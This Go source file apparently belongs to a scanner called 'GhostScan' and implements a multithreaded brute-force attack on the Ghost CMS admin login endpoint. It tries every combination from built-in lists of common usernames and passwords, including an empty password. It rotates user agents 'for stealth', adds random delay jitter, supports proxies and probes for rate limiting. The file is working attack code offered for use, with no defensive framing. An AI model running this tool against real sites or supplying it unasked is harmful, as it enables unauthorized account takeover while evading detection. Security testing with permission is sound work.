package bruteforce

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

// BruteForcer handles Ghost CMS authentication brute force attacks
type BruteForcer struct {
	client      *resty.Client
	targetURL   string
	threads     int
	verbose     bool
	delay       time.Duration
	randomDelay bool
	userAgents  []string
	proxy       string
	maxRetries  int
}

// Credential represents a username/password combination
type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// BruteForceResult holds the results of a brute force attack
type BruteForceResult struct {
	Success       bool         `json:"success"`
	Credentials   []Credential `json:"valid_credentials"`
	Attempts      int          `json:"total_attempts"`
	Duration      time.Duration `json:"duration"`
	RateLimited   bool         `json:"rate_limited"`
	BlockedIPs    []string     `json:"blocked_ips"`
	ErrorMessages []string     `json:"error_messages"`
	SuccessRate   float64      `json:"success_rate"`
}

// Config holds configuration for brute force attacks
type Config struct {
	Threads     int           `json:"threads"`
	Timeout     time.Duration `json:"timeout"`
	Delay       time.Duration `json:"delay"`
	RandomDelay bool          `json:"random_delay"`
	UserAgent   string        `json:"user_agent"`
	Proxy       string        `json:"proxy"`
	MaxRetries  int           `json:"max_retries"`
	Verbose     bool          `json:"verbose"`
}

// NewBruteForcer creates a new Ghost CMS brute forcer
func NewBruteForcer(targetURL string, config *Config) *BruteForcer {
	client := resty.New()
	client.SetTimeout(config.Timeout)
	client.SetHeader("User-Agent", config.UserAgent)
	client.SetRedirectPolicy(resty.NoRedirectPolicy())
	
	if config.Proxy != "" {
		client.SetProxy(config.Proxy)
	}
	
	userAgents := []string{
		config.UserAgent,
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}
	
	return &BruteForcer{
		client:      client,
		targetURL:   targetURL,
		threads:     config.Threads,
		verbose:     config.Verbose,
		delay:       config.Delay,
		randomDelay: config.RandomDelay,
		userAgents:  userAgents,
		proxy:       config.Proxy,
		maxRetries:  config.MaxRetries,
	}
}

// NewDefaultConfig creates a default configuration
func NewDefaultConfig() *Config {
	return &Config{
		Threads:     5,
		Timeout:     10 * time.Second,
		Delay:       1 * time.Second,
		RandomDelay: false,
		UserAgent:   "GhostScan/1.0",
		Proxy:       "",
		MaxRetries:  3,
		Verbose:     false,
	}
}

// BruteForce performs brute force attack against Ghost login
func (bf *BruteForcer) BruteForce(ctx context.Context, usernames, passwords []string) (*BruteForceResult, error) {
	start := time.Now()
	result := &BruteForceResult{
		Credentials: []Credential{},
	}
	
	// Create credential combinations
	credentials := []Credential{}
	for _, username := range usernames {
		for _, password := range passwords {
			credentials = append(credentials, Credential{
				Username: username,
				Password: password,
			})
		}
	}
	
	result.Attempts = len(credentials)
	
	if bf.verbose {
		fmt.Printf("[*] Starting brute force with %d combinations\n", len(credentials))
	}
	
	// Channel for credentials to test
	credChan := make(chan Credential, len(credentials))
	resultChan := make(chan Credential, len(credentials))
	
	// Fill credential channel
	for _, cred := range credentials {
		credChan <- cred
	}
	close(credChan)
	
	// Start worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < bf.threads; i++ {
		wg.Add(1)
		go bf.worker(ctx, credChan, resultChan, &wg)
	}
	
	// Wait for workers to complete
	go func() {
		wg.Wait()
		close(resultChan)
	}()
	
	// Collect results
	for validCred := range resultChan {
		result.Credentials = append(result.Credentials, validCred)
		result.Success = true
		if bf.verbose {
			fmt.Printf("[+] Valid credentials found: %s:%s\n", validCred.Username, validCred.Password)
		}
	}
	
	result.Duration = time.Since(start)
	return result, nil
}

// worker performs the actual brute force testing
func (bf *BruteForcer) worker(ctx context.Context, credChan <-chan Credential, resultChan chan<- Credential, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for cred := range credChan {
		select {
		case <-ctx.Done():
			return
		default:
			// Rotate user agent for stealth
			if len(bf.userAgents) > 1 {
				userAgent := bf.userAgents[rand.Intn(len(bf.userAgents))]
				bf.client.SetHeader("User-Agent", userAgent)
			}
			
			if bf.testCredential(ctx, cred) {
				resultChan <- cred
			}
			
			// Apply delay with optional randomization
			delay := bf.delay
			if bf.randomDelay && delay > 0 {
				// Add random jitter (±50% of base delay)
				jitter := time.Duration(rand.Int63n(int64(delay)))
				delay = delay/2 + jitter
			}
			time.Sleep(delay)
		}
	}
}

// testCredential tests a single credential against Ghost login
func (bf *BruteForcer) testCredential(ctx context.Context, cred Credential) bool {
	loginURL := bf.targetURL + "/ghost/api/v4/admin/session/"
	
	// Prepare login payload
	payload := map[string]interface{}{
		"username": cred.Username,
		"password": cred.Password,
	}
	
	// Attempt login
	resp, err := bf.client.R().
		SetContext(ctx).
		SetHeader("Content-Type", "application/json").
		SetBody(payload).
		Post(loginURL)
	
	if err != nil {
		return false
	}
	
	// Check for successful login
	if resp.StatusCode() == 200 || resp.StatusCode() == 201 {
		body := resp.String()
		// Check for session token or success indicators
		if strings.Contains(body, "access_token") || strings.Contains(body, "session") {
			return true
		}
		
		// Parse JSON response for success indicators
		if gjson.Get(body, "access_token").Exists() || gjson.Get(body, "session").Exists() {
			return true
		}
	}
	
	// Check for redirect to admin dashboard (successful login)
	if resp.StatusCode() == 302 {
		location := resp.Header().Get("Location")
		if strings.Contains(location, "/ghost/") {
			return true
		}
	}
	
	return false
}

// GetDefaultUsernames returns common Ghost CMS usernames
func GetDefaultUsernames() []string {
	return []string{
		"admin",
		"administrator",
		"ghost",
		"user",
		"test",
		"demo",
		"owner",
		"editor",
		"author",
		"admin@example.com",
		"admin@localhost",
		"admin@domain.com",
		"test@example.com",
		"demo@example.com",
	}
}

// GetDefaultPasswords returns common Ghost CMS passwords
func GetDefaultPasswords() []string {
	return []string{
		"admin",
		"password",
		"123456",
		"password123",
		"admin123",
		"ghost",
		"test",
		"demo",
		"changeme",
		"letmein",
		"welcome",
		"qwerty",
		"abc123",
		"admin@123",
		"root",
		"toor",
		"pass",
		"1234",
		"12345",
		"123456789",
		"password1",
		"admin1",
		"guest",
		"user",
		"", // Empty password
	}
}

// TestRateLimit checks if the target has rate limiting enabled
func (bf *BruteForcer) TestRateLimit(ctx context.Context) (bool, error) {
	loginURL := bf.targetURL + "/ghost/api/v4/admin/session/"
	
	// Send multiple rapid requests
	for i := 0; i < 10; i++ {
		payload := map[string]interface{}{
			"username": "testuser",
			"password": "testpass",
		}
		
		resp, err := bf.client.R().
			SetContext(ctx).
			SetHeader("Content-Type", "application/json").
			SetBody(payload).
			Post(loginURL)
		
		if err != nil {
			continue
		}
		
		// Check for rate limiting responses
		if resp.StatusCode() == 429 || resp.StatusCode() == 503 {
			return true, nil
		}
		
		body := resp.String()
		if strings.Contains(strings.ToLower(body), "rate limit") ||
		   strings.Contains(strings.ToLower(body), "too many requests") {
			return true, nil
		}
	}
	
	return false, nil
}